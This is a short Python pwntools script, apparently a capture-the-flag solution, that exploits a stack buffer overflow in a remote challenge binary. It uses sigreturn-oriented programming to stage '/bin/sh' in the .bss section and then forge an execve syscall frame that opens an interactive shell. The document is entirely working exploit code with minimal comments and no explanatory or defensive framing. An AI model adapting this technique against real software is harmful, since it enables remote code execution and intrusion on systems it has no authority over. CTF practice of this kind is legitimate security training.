#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc

p = remote('chall.v1t.site', 30211)

# input()

offset = 128 + 8

pop_rax = 0x4011ef
syscall = 0x4011f1
bss_addr = 0x404140

frame1 = SigreturnFrame()
frame1.rax = 0                     
frame1.rdi = 0                     
frame1.rsi = bss_addr              
frame1.rdx = 0x500                 
frame1.rsp = bss_addr + 0x200      
frame1.rbp = bss_addr + 0x300      
frame1.rip = syscall               

payload = flat (
    b'A' * offset,
    p64(pop_rax),
    p64(0xf),
    p64(syscall),
    bytes(frame1),
)

p.sendlineafter(b'pond.', payload)

data_to_write = b'/bin/sh\x00' + b'A' * (0x200 - 0x8)
data_to_write += p64(0x4011f7)

p.sendline(data_to_write)

frame = SigreturnFrame()
frame.rax = 0x3b                    # execve syscall number
frame.rdi = bss_addr              # cần tìm/write "/bin/sh" vào memory
frame.rsi = 0
frame.rdx = 0  
frame.rip = syscall                 # sau sigreturn sẽ gọi syscall execve

payload = flat (
    b'A' * 0x88,
    p64(pop_rax),
    p64(0xf),
    p64(syscall),
    bytes(frame),
)

p.sendlineafter(b'pond.', payload)
p.interactive()